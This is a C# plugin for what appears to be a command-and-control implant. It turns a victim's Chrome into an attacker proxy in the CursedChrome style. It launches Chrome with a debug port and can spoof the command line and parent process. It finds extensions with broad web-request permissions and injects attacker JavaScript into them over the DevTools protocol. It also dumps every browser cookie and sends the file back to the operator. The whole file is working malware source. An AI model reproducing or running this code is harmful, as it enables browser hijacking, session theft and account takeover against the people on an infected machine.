using Agent.Interfaces;
using System.Text.Json;
using Agent.Models;
using Agent.Utilities;
using System.Reflection;

namespace Agent
{
    public class Plugin : IInteractivePlugin, IFilePlugin
    {
        //Todo in the cursed.py file, add a `launch` bool that would indicate that the user wants us to handle the execution of chrome with a debug port.
        //https://sliver.sh/docs?name=Cursed maybe implement some of these interactive commands
        //Based on the code in sliver: https://github.com/BishopFox/sliver/blob/master/client/overlord/overlord.go
        public string Name => "cursed";
        private IMessageManager messageManager { get; set; }
        private ISpawner spawner { get; set; }
        private readonly List<string> main_permissions = new List<string> { "<all_urls>", "webRequest", "webRequestBlocking" };
        private readonly List<string> alt_permissions = new List<string> { "http://*/*", "https://*/*", "webRequest", "webRequestBlocking" };
        private Dictionary<string, string> cookiesOut = new Dictionary<string, string>();
        private CursedConfig config { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.config = new CursedConfig();
            this.messageManager = messageManager;
            this.spawner = spawner;
        }
        public async Task Execute(ServerJob job)
        {
            CursedArgs args = JsonSerializer.Deserialize<CursedArgs>(job.task.parameters);

            if(args.debug_port > 0)
            {
                this.config.debug_port = args.debug_port.ToString();
            }

            if(args.parent > 0)
            {
                this.config.parent = args.parent;
            }

            if (!string.IsNullOrEmpty(args.payload))
            {
                this.config.payload = args.payload;
            }

            if (string.IsNullOrEmpty(args.target))
            {
                this.config.target = args.target;
            }
        }
        private async Task CChrome(string payload, string task_id)
        {
            //Parse for chosen browser
            ReturnOutput("[+] Getting extensions", task_id);
            var extensions = await GetExtensions();

            if (extensions.Count <= 0)
            {
                //No extensions installed
                ReturnOutput("[!] No extensions found", task_id);
                return;
            }

            ReturnOutput($"[+] Got {extensions.Count} extensions, enumerating for potential injection candidates.", task_id);

            List<ChromeJsonObject> extensionCandidates = new List<ChromeJsonObject>();

            foreach (var extension in extensions)
            {
                ExtensionManifest manifest = await GetManifestFromExtension(extension);

                if (manifest is null)
                {
                    continue;
                }

                var permissions = GetPermissionsFromManifest(manifest);

                if (permissions.Count == 0)
                {
                    continue;
                }


                if (Misc.CheckListValues(permissions, main_permissions) || Misc.CheckListValues(alt_permissions, permissions))
                {
                    extensionCandidates.Add(extension);
                }

            }

            if (extensionCandidates.Count <= 0)
            {
                ReturnOutput("[!] Didn't find any good extension candidates.", task_id);
                return;
            }

            ReturnOutput($"[+] Found {extensionCandidates.Count} candidates!", task_id);

            if (string.IsNullOrEmpty(payload))
            {
                if (string.IsNullOrEmpty(this.config.target))
                {
                    ReturnOutput("[!] No target specified, and no payload set! Please set one of the options.", task_id);
                    return;
                }
                payload = this.config.GetDefaultPayload();
            }

            ReturnOutput("[+] Injecting our payload", task_id);
            foreach (var extension in extensionCandidates)
            {
                if(this.TryInjectJs(extension, payload, out var response))
                {
                    ReturnOutput("[+] Succesfully injected payload.", task_id);
                    ReturnOutput($"Response: {response}", task_id);
                    return;
                }
                ReturnOutput("[!] Failed to innject payload.", task_id);
                ReturnOutput($"Response: {response}", task_id);
            }
        }
        private async Task<List<ChromeJsonObject>> GetExtensions()
        {
            List<ChromeJsonObject> extensions = new List<ChromeJsonObject>();
            using (HttpClient client = new HttpClient())
            {
                try
                {
                    // Fetch list of targets from DevTools Protocol
                    string targetsUrl = $"http://localhost:{this.config.debug_port}/json/list";
                    string targetsJson = await client.GetStringAsync(targetsUrl);

                    List<ChromeJsonObject> targets = JsonSerializer.Deserialize<List<ChromeJsonObject>>(targetsJson);

                    foreach (var target in targets)
                    {
                        if (target.url.StartsWith("chrome-extension"))
                        {
                            extensions.Add(target);
                        }
                    }
                }
                catch (HttpRequestException)
                {
                }
            }
            return extensions;
        }
        private async Task<string> InjectJs(string id, string jsCode)
        {
            var extensions = await GetExtensions();

            foreach(var extension in extensions)
            {
                if(extension.id == id)
                {
                    return await InjectJs(jsCode, new Uri(extension.webSocketDebuggerUrl));
                }
            }
            return "Failed to identify specified extension.";
        }
        private bool TryInjectJs(ChromeJsonObject extension, string jsCode, out string response)
        {
            response = InjectJs(jsCode, new Uri(extension.webSocketDebuggerUrl)).Result;
            return true;
        }
        private async Task<string> InjectJs(string jsCode, Uri uri)
        {
            using (var webSocket = new System.Net.WebSockets.ClientWebSocket())
            {
                await webSocket.ConnectAsync(uri, System.Threading.CancellationToken.None);

                // Build the DevTools Protocol message to execute JavaScript
                var message = new
                {
                    id = 1,
                    method = "Runtime.evaluate",
                    @params = new
                    {
                        expression = jsCode,
                        returnByValue = true
                    }
                };

                // Convert the message to JSON and send it to the WebSocket
                string messageJson = JsonSerializer.Serialize(message);
                await WebSocketHelper.SendMessage(webSocket, messageJson);

                return await WebSocketHelper.ReceiveMessage(webSocket);
            }
        }
        private async Task<bool> TryGetCookies(string task_id)
        {

            List<ChromeJsonObject> extensions = this.GetExtensions().Result;

            if(extensions.Count == 0)
            {
                return false;
            }

            using (var webSocket = new System.Net.WebSockets.ClientWebSocket())
            {
                // Connect to Chrome's WebSocket debugger
                //Need to confirm if this is an okay value
                await webSocket.ConnectAsync(new Uri(extensions.First().webSocketDebuggerUrl), System.Threading.CancellationToken.None);

                // Send a message to request cookies
                var message = new
                {
                    id = 1,
                    method = "Network.getAllCookies",
                };
                //Send our request
                string messageJson = JsonSerializer.Serialize(message);
                await WebSocketHelper.SendMessage(webSocket, messageJson);
                
                //Wait for a response
                string response = await WebSocketHelper.ReceiveMessage(webSocket);

                //Get rid of the nonsense double result stuff
                JsonDocument responseJsonDocument = JsonDocument.Parse(response);
                JsonElement responseRoot = responseJsonDocument.RootElement;

                if (responseRoot.TryGetProperty("result", out JsonElement resultElement))
                {
                    //Strip outer edge, leaving only the good inside
                    this.cookiesOut.Add(task_id, resultElement.GetRawText());
                    ReturnOutput("[+] Returning parsed cookies file", task_id);
                    await StartSendFile(task_id);
                    return true;
                }

                //Something fucked up, so just return the raw response
                ReturnOutput("[!] Failed to parse cookies, returning raw output", task_id);
                this.cookiesOut.Add(task_id, resultElement.GetRawText());
                await StartSendFile(task_id);
                return false;
            }
        }
        private async Task<ExtensionManifest> GetManifestFromExtension(ChromeJsonObject extension)
        {
            //string response = await InjectJs(extension.id,"chrome.runtime.getManifest()");
            string response = String.Empty;

            if(TryInjectJs(extension, "chrome.runtime.getManifest()", out response))
            {
                JsonDocument responseJsonDocument = JsonDocument.Parse(response);
                JsonElement responseRoot = responseJsonDocument.RootElement;

                if (responseRoot.TryGetProperty("result", out JsonElement resultElement))
                {
                    return JsonSerializer.Deserialize<ExtensionManifest>(resultElement.GetRawText());
                }
            }

            return new ExtensionManifest();
        }
        private List<string> GetPermissionsFromManifest(ExtensionManifest manifest)
        {
            List<string> permissions = new List<string>();
            foreach (var permission in manifest.result.value.permissions)
            {
                permissions.Add(permission);
            }

            return permissions;
        }
        public async void Interact(InteractMessage message)
        {
            string user_input = Misc.Base64Decode(message.data).TrimEnd(Environment.NewLine.ToCharArray());
            var inputParts =  Misc.SplitCommandLine(user_input);
            switch (inputParts[0])
            {
                case "cursed":
                    if (inputParts.Length < 2)
                    {
                        ReturnOutput("Please specify a browser", message.task_id);
                        break;
                    }
                    await this.Cursed(inputParts[1], message.task_id);
                    break;
                case "cookies":
                    await this.TryGetCookies(message.task_id);
                    break;
                case "get":
                    if (inputParts.Length < 2)
                        await this.GetValue("", message.task_id);
                    else
                        await this.GetValue(inputParts[1], message.task_id);
                    break;
                case "set":
                    string value = String.Empty;
                    if (inputParts.Length > 3)
                        value = string.Join(" ", inputParts, 2, inputParts.Length - 2);
                    else
                        value = inputParts[2].TrimStart('"').TrimEnd('"');

                    //string args = string.Join(" ", inputParts, 2, inputParts.Length -1);
                    await this.SetConfig(inputParts[1], value, message.task_id);
                    break;
                case "inject-js":
                    if(inputParts.Count() < 3)
                    {
                        ReturnOutput("Please specify both an ID and a payload", message.task_id);
                        break;
                    }

                    var res = await this.InjectJs(inputParts[1], inputParts[2]);
                    break;
                case "spawn":

                    if(inputParts.Length < 2)
                    {
                        ReturnOutput("Please specify a browser.", message.task_id);
                        return;
                    }

                    if (!await SpawnElectron(inputParts[1], user_input, message.task_id))
                    {
                        ReturnOutput($"Failed to spawn {inputParts[1]}", message.task_id);
                        return;
                    }
                    ReturnOutput($"{inputParts[1]} spawned and listening on port {this.config.debug_port}", message.task_id);
                    break;
                case "exit":
                    this.config = new CursedConfig();
                    await this.messageManager.AddResponse(new InteractMessage()
                    {
                        task_id = message.task_id,
                        data = Misc.Base64Encode("Exited."),
                        message_type = InteractiveMessageType.Exit,
                    });
                    break;
                case "help":
                    await this.messageManager.AddResponse(new InteractMessage()
                    {
                        task_id = message.task_id,
                        data = Misc.Base64Encode(GetHelpText() + Environment.NewLine),
                        message_type = InteractiveMessageType.Output,
                    });
                    break;
            }
        }
        private async Task<bool> SpawnElectron(string choice, string full_cmdline, string task_id)
        {
            string commandline = string.Empty;

            switch (choice.ToLower())
            {
                case "chrome":
                    commandline = $"{ChromeFinder.FindChromePath()} --remote-debugging-port={this.config.debug_port}";
                    break;
                case "edge":
                    break;
                default:
                    commandline = full_cmdline;
                    return false;
            }

            string spoofedcmdline = string.Empty;
            if (!string.IsNullOrEmpty(this.config.cmdline))
            {
                spoofedcmdline = $"{ChromeFinder.FindChromePath()} {this.config.cmdline}";
            }

            SpawnOptions opts = new SpawnOptions()
            {
                task_id = task_id,
                commandline = commandline,
                spoofedcommandline = spoofedcmdline,
                output = false,
                parent = this.config.parent
            };

            return await spawner.Spawn(opts);
        }
        private async Task<bool> Cursed(string choice, string task_id)
        {
            if (string.IsNullOrEmpty(this.config.payload) && string.IsNullOrEmpty(this.config.target))
            {
                ReturnOutput("Please ensure either a payload or target is specified", task_id);
                return false;
            }

            if(string.IsNullOrEmpty(this.config.payload) && !string.IsNullOrEmpty(this.config.target))
            {
                this.config.payload = this.config.GetDefaultPayload();
            }

            switch (choice.ToLower())
            {
                case "chrome":
                     await CChrome(this.config.payload, task_id);
                    break;
                case "edge":
                    break;
                default:
                    return false;
            }
            return true;
        }
        private async Task SetConfig(string choice, string value, string task_id)
        {
            Type type = config.GetType();
            PropertyInfo property = type.GetProperty(choice);

            if (property != null)
            {
                if (choice == "parent")
                    property.SetValue(config, int.Parse(value.ToString()));
                else
                    property.SetValue(config, value);

                ReturnOutput("Set " + choice + " to " + value, task_id);
            }
            else
            {
                ReturnOutput($"Property '{choice}' not found on type '{type.Name}'.", task_id);
            }
        }
        private async Task GetValue(string choice, string task_id)
        {
            switch (choice.ToLower())
            {
                case "extensions":
                    var extensions = await this.GetExtensions();
                    ReturnOutput(JsonSerializer.Serialize(extensions), task_id);
                    break;
                case "":
                case null:
                    foreach (var prop in config.GetType().GetProperties())
                    {
                        if (prop.GetValue(config) is null)
                        {
                            ReturnOutput($"{prop.Name}: <empty>", "");
                        }
                        else
                        {
                            ReturnOutput($"{prop.Name}: {prop.GetValue(config).ToString()}", task_id);
                        }

                    }
                    break;
                default:
                    Type type = config.GetType();                    
                    try
                    {
                        var property = type.GetProperty(choice);
                        if(property is null)
                        {
                            ReturnOutput($"Property '{choice}' not found on type '{type.Name}'.", task_id);
                            return;
                        }

                        var propVal = property.GetValue(config);

                        if(propVal is null)
                        {
                            ReturnOutput($"{choice}: <empty>", task_id);
                            return;
                        }

                        ReturnOutput($"{choice}: {propVal}", task_id);
                    }
                    catch
                    {
                        ReturnOutput($"Property '{choice}' not found on type '{type.Name}'.", task_id);
                    }
                break;

            }
        }
        private string GetHelpText()
        {
            return """
    Commands:
        cursed [chrome|edge]
            Enumerates a spawned electron process via the local debugging port for extensions with permissions suitable for CursedChrome. 
                If a payload is specified it will use that, if not, it will use the built-in payload with the target setting 

        set [config] [value]
            Set's a configuration value. For cursed commands
                set debug_port 2020 //Set's the port to be used for the electron debug port
                set payload <payload> //Sets the payload to be used
                set target ws[s]://target:port //Sets the target for the default payload, this parameter is ignored if the payload has been manually set
                set cmdline "--user-data-dir=C:\\Users\\checkymander\\"
                set parent <pid>

        get [target|payload|extensions|debug-port]
            Get's the value of the configuration parameter and prints it to output
""";
        }
        private async void ReturnOutput(string message, string task_id)
        {
            await this.messageManager.AddResponse(new InteractMessage()
            {
                task_id = task_id,
                data = Misc.Base64Encode(message + Environment.NewLine),
                message_type = InteractiveMessageType.Output,
            });
        }
        public async Task HandleNextMessage(ServerResponseResult response)
        {
            Console.WriteLine("Starting handlenextmessage");

            if (!this.cookiesOut.ContainsKey(response.task_id))
            {
                return;
            }

            DownloadResponse dr = new DownloadResponse()
            {
                task_id = response.task_id,
                download = new DownloadResponseData
                {
                    total_chunks = 1,
                    is_screenshot = false,
                    filename = $"{Environment.MachineName}-cookies.json",
                    host = "",
                    chunk_num = 1,
                    chunk_data = Misc.Base64Encode(this.cookiesOut[response.task_id]),
                    file_id = response.file_id,
                },
            };

            await this.messageManager.AddResponse(dr.ToJson());

            this.cookiesOut.Remove(response.task_id);
        }
        private async Task StartSendFile(string task_id)
        {
            await messageManager.AddResponse(new DownloadResponse
            {
                download = new DownloadResponseData()
                {
                    total_chunks = 1,
                    filename = $"{Environment.MachineName}-cookies.json",
                    chunk_num = 0,
                    chunk_data = string.Empty,
                    is_screenshot = false,
                },
                task_id = task_id,
            }.ToJson());
        }
    }
}
